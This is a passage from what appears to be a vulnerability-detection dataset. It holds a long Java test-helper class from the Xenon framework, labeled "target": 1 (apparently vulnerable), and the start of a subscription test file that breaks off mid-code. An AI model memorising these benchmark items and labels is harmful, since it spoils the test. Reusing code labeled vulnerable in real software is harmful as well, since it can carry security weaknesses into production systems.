updateBody.removeOptions = optionsToDisable;\n        updateBody.addOptions = optionsToEnable;\n\n        URI configUri = UriUtils.buildConfigUri(serviceUri);\n        this.sender.sendAndWait(Operation.createPatch(configUri).setBody(updateBody));\n    }\n\n    public void setOperationQueueLimit(URI serviceUri, int limit) {\n        // send a set limit configuration request\n        ServiceConfigUpdateRequest body = ServiceConfigUpdateRequest.create();\n        body.operationQueueLimit = limit;\n        URI configUri = UriUtils.buildConfigUri(serviceUri);\n        this.sender.sendAndWait(Operation.createPatch(configUri).setBody(body));\n\n        // verify new operation limit is set\n        ServiceConfiguration config = this.sender.sendAndWait(Operation.createGet(configUri),\n                ServiceConfiguration.class);\n        assertEquals(\"Invalid queue limit\", body.operationQueueLimit,\n                (Integer) config.operationQueueLimit);\n    }\n\n    public void toggleNegativeTestMode(boolean enable) {\n        log(\"++++++ Negative test mode %s, failure logs expected: %s\", enable, enable);\n    }\n\n    public void logNodeProcessLogs(Set<URI> keySet, String logSuffix) {\n        List<URI> logServices = new ArrayList<>();\n        for (URI host : keySet) {\n            logServices.add(UriUtils.extendUri(host, logSuffix));\n        }\n\n        Map<URI, LogServiceState> states = this.getServiceState(null, LogServiceState.class,\n                logServices);\n        for (Entry<URI, LogServiceState> entry : states.entrySet()) {\n            log(\"Process log for node %s\\n\\n%s\", entry.getKey(),\n                    Utils.toJsonHtml(entry.getValue()));\n        }\n    }\n\n    public void logNodeManagementState(Set<URI> keySet) {\n        List<URI> services = new ArrayList<>();\n        for (URI host : keySet) {\n            services.add(UriUtils.extendUri(host, ServiceUriPaths.CORE_MANAGEMENT));\n        }\n\n        Map<URI, ServiceHostState> states = this.getServiceState(null, ServiceHostState.class,\n                services);\n        for (Entry<URI, ServiceHostState> entry : states.entrySet()) {\n            log(\"Management state for node %s\\n\\n%s\", entry.getKey(),\n                    Utils.toJsonHtml(entry.getValue()));\n        }\n    }\n\n    public void tearDownInProcessPeers() {\n        for (VerificationHost h : this.localPeerHosts.values()) {\n            if (h == null) {\n                continue;\n            }\n            stopHost(h);\n        }\n    }\n\n    public void stopHost(VerificationHost host) {\n        log(\"Stopping host %s (%s)\", host.getUri(), host.getId());\n        host.tearDown();\n        this.peerHostIdToNodeState.remove(host.getId());\n        this.peerNodeGroups.remove(host.getUri());\n        this.localPeerHosts.remove(host.getUri());\n    }\n\n    public void stopHostAndPreserveState(ServiceHost host) {\n        log(\"Stopping host %s\", host.getUri());\n        // Do not delete the temporary directory with the lucene index. Notice that\n        // we do not call host.tearDown(), which will delete disk state, we simply\n        // stop the host and remove it from the peer node tracking tables\n        host.stop();\n        this.peerHostIdToNodeState.remove(host.getId());\n        this.peerNodeGroups.remove(host.getUri());\n        this.localPeerHosts.remove(host.getUri());\n    }\n\n    public boolean isLongDurationTest() {\n        return this.testDurationSeconds > 0;\n    }\n\n    public void logServiceStats(URI uri, TestResults testResults) {\n        ServiceStats serviceStats = logServiceStats(uri);\n        if (testResults != null) {\n            testResults.getReport().stats(uri, serviceStats);\n        }\n    }\n\n    public ServiceStats logServiceStats(URI uri) {\n        ServiceStats stats = null;\n        try {\n            stats = getServiceState(null, ServiceStats.class, UriUtils.buildStatsUri(uri));\n            if (stats == null || stats.entries == null) {\n                return null;\n            }\n\n            StringBuilder sb = new StringBuilder();\n            sb.append(String.format(\"Stats for %s%n\", uri));\n            sb.append(String.format(\"\\tCount\\t\\t\\tAvg\\t\\tTotal\\t\\t\\tName%n\"));\n\n            stats.entries.values().stream()\n                    .sorted((s1, s2) -> s1.name.compareTo(s2.name))\n                    .forEach((s) -> logStat(uri, s, sb));\n\n            log(sb.toString());\n        } catch (Throwable e) {\n            log(\"Failure getting stats: %s\", e.getMessage());\n        }\n\n        return stats;\n    }\n\n    private void logStat(URI serviceUri, ServiceStat st, StringBuilder sb) {\n        ServiceStatLogHistogram hist = st.logHistogram;\n        st.logHistogram = null;\n\n        double total = st.accumulatedValue != 0 ? st.accumulatedValue : st.latestValue;\n        double avg = total / st.version;\n        sb.append(\n                String.format(\"\\t%08d\\t\\t%08.2f\\t%010.2f\\t%s%n\", st.version, avg, total, st.name));\n        if (hist == null) {\n            return;\n        }\n    }\n\n    /**\n     * Retrieves node group service state from all peers and logs it in JSON format\n     */\n    public void logNodeGroupState() {\n        List<Operation> ops = new ArrayList<>();\n        for (URI nodeGroup : getNodeGroupMap().values()) {\n            ops.add(Operation.createGet(nodeGroup));\n        }\n        List<NodeGroupState> stats = this.sender.sendAndWait(ops, NodeGroupState.class);\n        for (NodeGroupState stat : stats) {\n            log(\"%s\", Utils.toJsonHtml(stat));\n        }\n    }\n\n    public void setServiceMaintenanceIntervalMicros(String path, long micros) {\n        setServiceMaintenanceIntervalMicros(UriUtils.buildUri(this, path), micros);\n    }\n\n    public void setServiceMaintenanceIntervalMicros(URI u, long micros) {\n        ServiceConfigUpdateRequest updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.maintenanceIntervalMicros = micros;\n        URI configUri = UriUtils.extendUri(u, ServiceHost.SERVICE_URI_SUFFIX_CONFIG);\n        this.sender.sendAndWait(Operation.createPatch(configUri).setBody(updateBody));\n    }\n\n    /**\n     * Toggles operation tracing on the service host using the management service\n     */\n    public void toggleOperationTracing(URI baseHostURI, boolean enable) {\n        toggleOperationTracing(baseHostURI, null, enable);\n    }\n\n    /**\n     * Toggles operation tracing on the service host using the management service\n     */\n    public void toggleOperationTracing(URI baseHostURI, Level level, boolean enable) {\n        ServiceHostManagementService.ConfigureOperationTracingRequest r = new ServiceHostManagementService.ConfigureOperationTracingRequest();\n        r.enable = enable ? ServiceHostManagementService.OperationTracingEnable.START\n                : ServiceHostManagementService.OperationTracingEnable.STOP;\n        if (level != null) {\n            r.level = level.toString();\n        }\n        r.kind = ServiceHostManagementService.ConfigureOperationTracingRequest.KIND;\n\n        this.setSystemAuthorizationContext();\n        // we convert body to JSON to verify client requests using HTTP client\n        // with JSON, will work\n        this.sender.sendAndWait(Operation.createPatch(\n                UriUtils.extendUri(baseHostURI, ServiceHostManagementService.SELF_LINK))\n                .setBody(Utils.toJson(r)));\n        this.resetAuthorizationContext();\n    }\n\n    public CompletionHandler getSuccessOrFailureCompletion() {\n        return (o, e) -> {\n            completeIteration();\n        };\n    }\n\n    public static QueryValidationServiceState buildQueryValidationState() {\n        QueryValidationServiceState newState = new QueryValidationServiceState();\n\n        newState.ignoredStringValue = \"should be ignored by index\";\n        newState.exampleValue = new ExampleServiceState();\n        newState.exampleValue.counter = 10L;\n        newState.exampleValue.name = \"example name\";\n\n        newState.nestedComplexValue = new NestedType();\n        newState.nestedComplexValue.id = UUID.randomUUID().toString();\n        newState.nestedComplexValue.longValue = Long.MIN_VALUE;\n\n        newState.listOfExampleValues = new ArrayList<>();\n        ExampleServiceState exampleItem = new ExampleServiceState();\n        exampleItem.name = \"nested name\";\n        newState.listOfExampleValues.add(exampleItem);\n\n        newState.listOfStrings = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            newState.listOfStrings.add(UUID.randomUUID().toString());\n        }\n\n        newState.arrayOfExampleValues = new ExampleServiceState[2];\n        newState.arrayOfExampleValues[0] = new ExampleServiceState();\n        newState.arrayOfExampleValues[0].name = UUID.randomUUID().toString();\n\n        newState.arrayOfStrings = new String[2];\n        newState.arrayOfStrings[0] = UUID.randomUUID().toString();\n        newState.arrayOfStrings[1] = UUID.randomUUID().toString();\n\n        newState.mapOfStrings = new HashMap<>();\n        String keyOne = \"keyOne\";\n        String keyTwo = \"keyTwo\";\n        String valueOne = UUID.randomUUID().toString();\n        String valueTwo = UUID.randomUUID().toString();\n        newState.mapOfStrings.put(keyOne, valueOne);\n        newState.mapOfStrings.put(keyTwo, valueTwo);\n\n        newState.mapOfBooleans = new HashMap<>();\n        newState.mapOfBooleans.put(\"trueKey\", true);\n        newState.mapOfBooleans.put(\"falseKey\", false);\n\n        newState.mapOfBytesArrays = new HashMap<>();\n        newState.mapOfBytesArrays.put(\"bytes\", new byte[] { 0x01, 0x02 });\n\n        newState.mapOfDoubles = new HashMap<>();\n        newState.mapOfDoubles.put(\"one\", 1.0);\n        newState.mapOfDoubles.put(\"minusOne\", -1.0);\n\n        newState.mapOfEnums = new HashMap<>();\n        newState.mapOfEnums.put(\"GET\", Service.Action.GET);\n\n        newState.mapOfLongs = new HashMap<>();\n        newState.mapOfLongs.put(\"one\", 1L);\n        newState.mapOfLongs.put(\"two\", 2L);\n\n        newState.mapOfNestedTypes = new HashMap<>();\n        newState.mapOfNestedTypes.put(\"nested\", newState.nestedComplexValue);\n\n        newState.mapOfUris = new HashMap<>();\n        newState.mapOfUris.put(\"uri\", UriUtils.buildUri(\"/foo/bar\"));\n\n        newState.ignoredArrayOfStrings = new String[2];\n        newState.ignoredArrayOfStrings[0] = UUID.randomUUID().toString();\n        newState.ignoredArrayOfStrings[1] = UUID.randomUUID().toString();\n\n        newState.binaryContent = UUID.randomUUID().toString().getBytes();\n        return newState;\n    }\n\n    public void updateServiceOptions(Collection<String> selfLinks,\n            ServiceConfigUpdateRequest cfgBody) {\n\n        List<Operation> ops = new ArrayList<>();\n        for (String link : selfLinks) {\n            URI bUri = UriUtils.buildUri(getUri(), link,\n                    ServiceHost.SERVICE_URI_SUFFIX_CONFIG);\n\n            ops.add(Operation.createPatch(bUri).setBody(cfgBody));\n        }\n        this.sender.sendAndWait(ops);\n    }\n\n    public void addPeerNode(VerificationHost h) {\n        URI localBaseURI = h.getPublicUri();\n        URI nodeGroup = UriUtils.buildUri(h.getPublicUri(), ServiceUriPaths.DEFAULT_NODE_GROUP);\n        this.peerNodeGroups.put(localBaseURI, nodeGroup);\n        this.localPeerHosts.put(localBaseURI, h);\n    }\n\n    public void addPeerNode(URI ngUri) {\n        URI hostUri = UriUtils.buildUri(ngUri.getScheme(), ngUri.getHost(), ngUri.getPort(), null,\n                null);\n        this.peerNodeGroups.put(hostUri, ngUri);\n    }\n\n    public ServiceDocumentDescription buildDescription(Class<? extends ServiceDocument> type) {\n        EnumSet<ServiceOption> options = EnumSet.noneOf(ServiceOption.class);\n        return Builder.create().buildDescription(type, options);\n    }\n\n    public void logAllDocuments(Set<URI> baseHostUris) {\n        QueryTask task = new QueryTask();\n        task.setDirect(true);\n        task.querySpec = new QuerySpecification();\n        task.querySpec.query.setTermPropertyName(\"documentSelfLink\").setTermMatchValue(\"*\");\n        task.querySpec.query.setTermMatchType(MatchType.WILDCARD);\n        task.querySpec.options = EnumSet.of(QueryOption.EXPAND_CONTENT);\n\n        List<Operation> ops = new ArrayList<>();\n        for (URI baseHost : baseHostUris) {\n            Operation queryPost = Operation\n                    .createPost(UriUtils.buildUri(baseHost, ServiceUriPaths.CORE_QUERY_TASKS))\n                    .setBody(task);\n            ops.add(queryPost);\n        }\n        List<QueryTask> queryTasks = this.sender.sendAndWait(ops, QueryTask.class);\n        for (QueryTask queryTask : queryTasks) {\n            log(Utils.toJsonHtml(queryTask));\n        }\n    }\n\n    public void setSystemAuthorizationContext() {\n        setAuthorizationContext(getSystemAuthorizationContext());\n    }\n\n    public void resetSystemAuthorizationContext() {\n        super.setAuthorizationContext(null);\n    }\n\n    @Override\n    public void addPrivilegedService(Class<? extends Service> serviceType) {\n        // Overriding just for test cases\n        super.addPrivilegedService(serviceType);\n    }\n\n    @Override\n    public void setAuthorizationContext(AuthorizationContext context) {\n        super.setAuthorizationContext(context);\n    }\n\n    public void resetAuthorizationContext() {\n        super.setAuthorizationContext(null);\n    }\n\n    /**\n     * Inject user identity into operation context.\n     *\n     * @param userServicePath user document link\n     */\n    public AuthorizationContext assumeIdentity(String userServicePath)\n            throws GeneralSecurityException {\n        return assumeIdentity(userServicePath, null);\n    }\n\n    /**\n     * Inject user identity into operation context.\n     *\n     * @param userServicePath user document link\n     * @param properties custom properties in claims\n     * @throws GeneralSecurityException any generic security exception\n     */\n    public AuthorizationContext assumeIdentity(String userServicePath,\n            Map<String, String> properties) throws GeneralSecurityException {\n        Claims.Builder builder = new Claims.Builder();\n        builder.setSubject(userServicePath);\n        builder.setProperties(properties);\n        Claims claims = builder.getResult();\n        String token = getTokenSigner().sign(claims);\n\n        AuthorizationContext.Builder ab = AuthorizationContext.Builder.create();\n        ab.setClaims(claims);\n        ab.setToken(token);\n\n        // Associate resulting authorization context with this thread\n        AuthorizationContext authContext = ab.getResult();\n        setAuthorizationContext(authContext);\n        return authContext;\n    }\n\n    public void deleteAllChildServices(URI factoryURI) {\n        deleteOrStopAllChildServices(factoryURI, false, true);\n    }\n\n    public void deleteOrStopAllChildServices(\n            URI factoryURI, boolean stopOnly, boolean useFullQuorum) {\n        ServiceDocumentQueryResult res = getFactoryState(factoryURI);\n        if (res.documentLinks.isEmpty()) {\n            return;\n        }\n        List<Operation> ops = new ArrayList<>();\n        for (String link : res.documentLinks) {\n            Operation op = Operation.createDelete(UriUtils.buildUri(factoryURI, link));\n            if (stopOnly) {\n                op.addPragmaDirective(Operation.PRAGMA_DIRECTIVE_NO_INDEX_UPDATE);\n            } else {\n                if (useFullQuorum) {\n                    op.addRequestHeader(Operation.REPLICATION_QUORUM_HEADER,\n                            Operation.REPLICATION_QUORUM_HEADER_VALUE_ALL);\n                }\n            }\n            ops.add(op);\n        }\n        this.sender.sendAndWait(ops);\n    }\n\n    public <T extends ServiceDocument> ServiceDocument verifyPost(Class<T> documentType,\n            String factoryLink,\n            T state,\n            int expectedStatusCode) {\n        URI uri = UriUtils.buildUri(this, factoryLink);\n\n        Operation op = Operation.createPost(uri).setBody(state);\n        Operation response = this.sender.sendAndWait(op);\n        String message = String.format(\"Status code expected: %s, actual: %s\", expectedStatusCode,\n                response.getStatusCode());\n        assertEquals(message, expectedStatusCode, response.getStatusCode());\n\n        return response.getBody(documentType);\n    }\n\n    protected TemporaryFolder getTemporaryFolder() {\n        return this.temporaryFolder;\n    }\n\n    public void setTemporaryFolder(TemporaryFolder temporaryFolder) {\n        this.temporaryFolder = temporaryFolder;\n    }\n\n    /**\n     * Sends an operation and waits for completion. CompletionHandler on passed operation will be cleared.\n     */\n    public void sendAndWaitExpectSuccess(Operation op) {\n        // to be compatible with old behavior, clear the completion handler\n        op.setCompletion(null);\n\n        this.sender.sendAndWait(op);\n    }\n\n    public void sendAndWaitExpectFailure(Operation op) {\n        sendAndWaitExpectFailure(op, null);\n    }\n\n    public void sendAndWaitExpectFailure(Operation op, Integer expectedFailureCode) {\n\n        // to be compatible with old behavior, clear the completion handler\n        op.setCompletion(null);\n\n        FailureResponse resposne = this.sender.sendAndWaitFailure(op);\n\n        if (expectedFailureCode == null) {\n            return;\n        }\n        String msg = \"got unexpected status: \" + expectedFailureCode;\n        assertEquals(msg, (int) expectedFailureCode, resposne.op.getStatusCode());\n    }\n\n    /**\n     * Sends an operation and waits for completion.\n     */\n    public void sendAndWait(Operation op) {\n        // assume completion is attached, using our getCompletion() or\n        // getExpectedFailureCompletion()\n        testStart(1);\n        send(op);\n        testWait();\n    }\n\n    /**\n     * Sends an operation, waits for completion and return the response representation.\n     */\n    public Operation waitForResponse(Operation op) {\n        final Operation[] result = new Operation[1];\n        op.nestCompletion((o, e) -> {\n            result[0] = o;\n            completeIteration();\n        });\n\n        sendAndWait(op);\n\n        return result[0];\n    }\n\n    /**\n     * Decorates a {@link CompletionHandler} with a try/catch-all\n     * and fails the current iteration on exception. Allow for calling\n     * Assert.assert* directly in a handler.\n     *\n     * A safe handler will call completeIteration or failIteration exactly once.\n     *\n     * @param handler\n     * @return\n     */\n    public CompletionHandler getSafeHandler(CompletionHandler handler) {\n        return (o, e) -> {\n            try {\n                handler.handle(o, e);\n                completeIteration();\n            } catch (Throwable t) {\n                failIteration(t);\n            }\n        };\n    }\n\n    public CompletionHandler getSafeHandler(TestContext ctx, CompletionHandler handler) {\n        return (o, e) -> {\n            try {\n                handler.handle(o, e);\n                ctx.completeIteration();\n            } catch (Throwable t) {\n                ctx.failIteration(t);\n            }\n        };\n    }\n\n    /**\n     * Creates a new service instance of type {@code service} via a {@code HTTP POST} to the service\n     * factory URI (which is discovered automatically based on {@code service}). It passes {@code\n     * state} as the body of the {@code POST}.\n     * <p/>\n     * See javadoc for <i>handler</i> param for important details on how to properly use this\n     * method. If your test expects the service instance to be created successfully, you might use:\n     * <pre>\n     * String[] taskUri = new String[1];\n     * CompletionHandler successHandler = getCompletionWithUri(taskUri);\n     * sendFactoryPost(ExampleTaskService.class, new ExampleTaskServiceState(), successHandler);\n     * </pre>\n     *\n     * @param service the type of service to create\n     * @param state   the body of the {@code POST} to use to create the service instance\n     * @param handler the completion handler to use when creating the service instance.\n     *                <b>IMPORTANT</b>: This handler must properly call {@code host.failIteration()}\n     *                or {@code host.completeIteration()}.\n     * @param <T>     the state that represents the service instance\n     */\n    public <T extends ServiceDocument> void sendFactoryPost(Class<? extends Service> service,\n            T state, CompletionHandler handler) {\n        URI factoryURI = UriUtils.buildFactoryUri(this, service);\n        log(Level.INFO, \"Creating POST for [uri=%s] [body=%s]\", factoryURI, state);\n        Operation createPost = Operation.createPost(factoryURI)\n                .setBody(state)\n                .setCompletion(handler);\n\n        this.sender.sendAndWait(createPost);\n    }\n\n    /**\n     * Helper completion handler that:\n     * <ul>\n     * <li>Expects valid response to be returned; no exceptions when processing the operation</li>\n     * <li>Expects a {@code ServiceDocument} to be returned in the response body. The response's\n     * {@link ServiceDocument#documentSelfLink} will be stored in {@code storeUri[0]} so it can be\n     * used for test assertions and logic</li>\n     * </ul>\n     *\n     * @param storedLink The {@code documentSelfLink} of the created {@code ServiceDocument} will be\n     *                 stored in {@code storedLink[0]} so it can be used for test assertions and\n     *                 logic. This must be non-null and its length cannot be zero\n     * @return a completion handler, handy for using in methods like {@link\n     * #sendFactoryPost(Class, ServiceDocument, CompletionHandler)}\n     */\n    public CompletionHandler getCompletionWithSelflink(String[] storedLink) {\n        if (storedLink == null || storedLink.length == 0) {\n            throw new IllegalArgumentException(\n                    \"storeUri must be initialized and have room for at least one item\");\n        }\n\n        return (op, ex) -> {\n            if (ex != null) {\n                failIteration(ex);\n                return;\n            }\n\n            ServiceDocument response = op.getBody(ServiceDocument.class);\n            if (response == null) {\n                failIteration(new IllegalStateException(\n                        \"Expected non-null ServiceDocument in response body\"));\n                return;\n            }\n\n            log(Level.INFO, \"Created service instance. [selfLink=%s] [kind=%s]\",\n                    response.documentSelfLink, response.documentKind);\n            storedLink[0] = response.documentSelfLink;\n            completeIteration();\n        };\n    }\n\n    /**\n     * Helper completion handler that:\n     * <ul>\n     * <li>Expects an exception when processing the handler; it is a {@code failIteration} if an\n     * exception is <b>not</b> thrown.</li>\n     * <li>The exception will be stored in {@code storeException[0]} so it can be used for test\n     * assertions and logic.</li>\n     * </ul>\n     *\n     * @param storeException the exception that occurred in completion handler will be stored in\n     *                       {@code storeException[0]} so it can be used for test assertions and\n     *                       logic. This must be non-null and its length cannot be zero.\n     * @return a completion handler, handy for using in methods like {@link\n     * #sendFactoryPost(Class, ServiceDocument, CompletionHandler)}\n     */\n    public CompletionHandler getExpectedFailureCompletionReturningThrowable(\n            Throwable[] storeException) {\n        if (storeException == null || storeException.length == 0) {\n            throw new IllegalArgumentException(\n                    \"storeException must be initialized and have room for at least one item\");\n        }\n\n        return (op, ex) -> {\n            if (ex == null) {\n                failIteration(new IllegalStateException(\"Failure expected\"));\n            }\n            storeException[0] = ex;\n            completeIteration();\n        };\n    }\n\n    /**\n     * Helper method that waits for a query task to reach the expected stage\n     */\n    public QueryTask waitForQueryTask(URI uri, TaskState.TaskStage expectedStage) {\n\n        // If the task's state ever reaches one of these \"final\" stages, we can stop waiting...\n        List<TaskState.TaskStage> finalTaskStages = Arrays\n                .asList(TaskState.TaskStage.CANCELLED, TaskState.TaskStage.FAILED,\n                        TaskState.TaskStage.FINISHED, expectedStage);\n\n        String error = String.format(\"Task did not reach expected state %s\", expectedStage);\n        Object[] r = new Object[1];\n        final URI finalUri = uri;\n        waitFor(error, () -> {\n            QueryTask state = this.getServiceState(null, QueryTask.class, finalUri);\n            r[0] = state;\n            if (state.taskInfo != null) {\n                if (finalTaskStages.contains(state.taskInfo.stage)) {\n                    return true;\n                }\n            }\n            return false;\n        });\n        return (QueryTask) r[0];\n    }\n\n    /**\n     * Helper method that waits for {@code taskUri} to have a {@link TaskState.TaskStage} == {@code\n     * TaskStage.FINISHED}.\n     *\n     * @param type    The class type that represent's the task's state\n     * @param taskUri the URI of the task to wait for\n     * @param <T>     the type that represent's the task's state\n     * @return the state of the task once's it's {@code FINISHED}\n     */\n    public <T extends TaskService.TaskServiceState> T waitForFinishedTask(Class<T> type,\n            String taskUri) {\n        return waitForTask(type, taskUri, TaskState.TaskStage.FINISHED);\n    }\n\n    /**\n     * Helper method that waits for {@code taskUri} to have a {@link TaskState.TaskStage} == {@code\n     * TaskStage.FINISHED}.\n     *\n     * @param type    The class type that represent's the task's state\n     * @param taskUri the URI of the task to wait for\n     * @param <T>     the type that represent's the task's state\n     * @return the state of the task once's it's {@code FINISHED}\n     */\n    public <T extends TaskService.TaskServiceState> T waitForFinishedTask(Class<T> type,\n            URI taskUri) {\n        return waitForTask(type, taskUri.toString(), TaskState.TaskStage.FINISHED);\n    }\n\n    /**\n     * Helper method that waits for {@code taskUri} to have a {@link TaskState.TaskStage} == {@code\n     * TaskStage.FAILED}.\n     *\n     * @param type    The class type that represent's the task's state\n     * @param taskUri the URI of the task to wait for\n     * @param <T>     the type that represent's the task's state\n     * @return the state of the task once's it s {@code FAILED}\n     */\n    public <T extends TaskService.TaskServiceState> T waitForFailedTask(Class<T> type,\n            String taskUri) {\n        return waitForTask(type, taskUri, TaskState.TaskStage.FAILED);\n    }\n\n    /**\n     * Helper method that waits for {@code taskUri} to have a {@link TaskState.TaskStage} == {@code\n     * expectedStage}.\n     *\n     * @param type          The class type of that represents the task's state\n     * @param taskUri       the URI of the task to wait for\n     * @param expectedStage the stage we expect the task to eventually get to\n     * @param <T>           the type that represents the task's state\n     * @return the state of the task once it's {@link TaskState.TaskStage} == {@code expectedStage}\n     */\n    public <T extends TaskService.TaskServiceState> T waitForTask(Class<T> type, String taskUri,\n            TaskState.TaskStage expectedStage) {\n        return waitForTask(type, taskUri, expectedStage, false);\n    }\n\n    /**\n     * Helper method that waits for {@code taskUri} to have a {@link TaskState.TaskStage} == {@code\n     * expectedStage}.\n     *\n     * @param type          The class type of that represents the task's state\n     * @param taskUri       the URI of the task to wait for\n     * @param expectedStage the stage we expect the task to eventually get to\n     * @param useQueryTask  Uses {@link QueryTask} to retrieve the current stage of the Task\n     * @param <T>           the type that represents the task's state\n     * @return the state of the task once it's {@link TaskState.TaskStage} == {@code expectedStage}\n     */\n    @SuppressWarnings(\"unchecked\")\n    public <T extends TaskService.TaskServiceState> T waitForTask(Class<T> type, String taskUri,\n            TaskState.TaskStage expectedStage, boolean useQueryTask) {\n        URI uri = UriUtils.buildUri(taskUri);\n\n        if (!uri.isAbsolute()) {\n            uri = UriUtils.buildUri(this, taskUri);\n        }\n\n        List<TaskState.TaskStage> finalTaskStages = Arrays\n                .asList(TaskState.TaskStage.CANCELLED, TaskState.TaskStage.FAILED,\n                        TaskState.TaskStage.FINISHED);\n\n        String error = String.format(\"Task did not reach expected state %s\", expectedStage);\n        Object[] r = new Object[1];\n        final URI finalUri = uri;\n        waitFor(error, () -> {\n            T state = (useQueryTask)\n                    ? this.getServiceStateUsingQueryTask(type, taskUri)\n                    : this.getServiceState(null, type, finalUri);\n\n            r[0] = state;\n            if (state.taskInfo != null) {\n                if (expectedStage == state.taskInfo.stage) {\n                    return true;\n                }\n                if (finalTaskStages.contains(state.taskInfo.stage)) {\n                    fail(String.format(\n                            \"Task was expected to reach stage %s but reached a final stage %s\",\n                            expectedStage, state.taskInfo.stage));\n                }\n            }\n            return false;\n        });\n        return (T) r[0];\n    }\n\n    @FunctionalInterface\n    public interface WaitHandler {\n        boolean isReady() throws Throwable;\n    }\n\n    public void waitFor(String timeoutMsg, WaitHandler wh) {\n        ExceptionTestUtils.executeSafely(() -> {\n            Date exp = getTestExpiration();\n            while (new Date().before(exp)) {\n                if (wh.isReady()) {\n                    return;\n                }\n                // sleep for a tenth of the maintenance interval\n                Thread.sleep(TimeUnit.MICROSECONDS.toMillis(getMaintenanceIntervalMicros()) / 10);\n            }\n            throw new TimeoutException(timeoutMsg);\n        });\n    }\n\n    public void setSingleton(boolean enable) {\n        this.isSingleton = enable;\n    }\n\n    /*\n    * Running restart tests in VMs, in over provisioned CI will cause a restart using the same\n    * index sand box to fail, due to a file system LockHeldException.\n    * The sleep just reduces the false negative test failure rate, but it can still happen.\n    * Not much else we can do other adding some weird polling on all the index files.\n    *\n    * Returns true if host restarted, false if retry attempts expired or other exceptions where thrown\n     */\n    public static boolean restartStatefulHost(ServiceHost host, boolean failOnIndexDeletion)\n            throws Throwable {\n        long exp = Utils.fromNowMicrosUtc(host.getOperationTimeoutMicros());\n\n        do {\n            Thread.sleep(2000);\n            try {\n                if (host.isAuthorizationEnabled()) {\n                    host.setAuthenticationService(new AuthorizationContextService());\n                }\n                host.start();\n                return true;\n            } catch (Throwable e) {\n                Logger.getAnonymousLogger().warning(String\n                        .format(\"exception on host restart: %s\", e.getMessage()));\n                try {\n                    host.stop();\n                } catch (Throwable e1) {\n                    return false;\n                }\n                if (e instanceof LockObtainFailedException && !failOnIndexDeletion) {\n                    Logger.getAnonymousLogger()\n                            .warning(\"Lock held exception on host restart, retrying\");\n                    continue;\n                }\n                return false;\n            }\n        } while (Utils.getSystemNowMicrosUtc() < exp);\n        return false;\n    }\n\n    public void waitForGC() {\n        if (!isStressTest()) {\n            return;\n        }\n        for (int k = 0; k < 10; k++) {\n            Runtime.getRuntime().gc();\n            Runtime.getRuntime().runFinalization();\n        }\n    }\n\n    public TestRequestSender getTestRequestSender() {\n        return this.sender;\n    }\n}\n", "target": 1}
{"idx": 1097, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.ConcurrentSkipListMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\nimport org.junit.After;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.ServiceSubscriptionState.ServiceSubscriber;\nimport com.vmware.xenon.common.http.netty.NettyHttpServiceClient;\nimport com.vmware.xenon.common.test.MinimalTestServiceState;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupConfig;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\n\n\npublic class TestSubscriptions extends BasicTestCase {\n    private final int NODE_COUNT = 2;\n\n    public int serviceCount = 100;\n    public long updateCount = 10;\n    public long iterationCount = 0;\n\n    @Override\n    public void beforeHostStart(VerificationHost host) {\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS\n                .toMicros(VerificationHost.FAST_MAINT_INTERVAL_MILLIS));\n    }\n\n    @After\n    public void tearDown() {\n        this.host.tearDown();\n        this.host.tearDownInProcessPeers();\n    }\n\n    private void setUpPeers() throws Throwable {\n        this.host.setUpPeerHosts(this.NODE_COUNT);\n        this.host.joinNodesAndVerifyConvergence(this.NODE_COUNT);\n    }\n\n    @Test\n    public void remoteAndReliableSubscriptionsLoop() throws Throwable {\n        for (int i = 0; i < this.iterationCount; i++) {\n            tearDown();\n            this.host = createHost();\n            initializeHost(this.host);\n            beforeHostStart(this.host);\n            this.host.start();\n            remoteAndReliableSubscriptions();\n        }\n    }\n\n    @Test\n    public void remoteAndReliableSubscriptions() throws Throwable {\n        setUpPeers();\n\n        // pick one host to post to\n        VerificationHost serviceHost = this.host.getPeerHost();\n        URI factoryUri = UriUtils.buildUri(serviceHost, ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        // test host to receive notifications\n        VerificationHost localHost = this.host;\n        int serviceCount = 1;\n        // create example service documents across all nodes\n        List<URI> exampleURIs = serviceHost.createExampleServices(serviceHost, serviceCount, null);\n        TestContext oneUseNotificationCtx = this.host.testCreate(1);\n        StatelessService notificationTarget = new StatelessService() {\n            @Override\n            public void handleRequest(Operation update) {\n                update.complete();\n                if (update.getAction().equals(Action.PATCH)) {\n                    if (update.getUri().getHost() == null) {\n                        oneUseNotificationCtx.fail(new IllegalStateException(\n                                \"Notification URI does not have host specified\"));\n                        return;\n                    }\n                    oneUseNotificationCtx.complete();\n                }\n            }\n        };\n\n        String[] ownerHostId = new String[1];\n        URI uri = exampleURIs.get(0);\n        URI subUri = UriUtils.buildUri(serviceHost.getUri(), uri.getPath());\n        TestContext subscribeCtx = this.host.testCreate(1);\n        Operation subscribe = Operation.createPost(subUri)\n                .setCompletion(subscribeCtx.getCompletion());\n        subscribe.setReferer(localHost.getReferer());\n        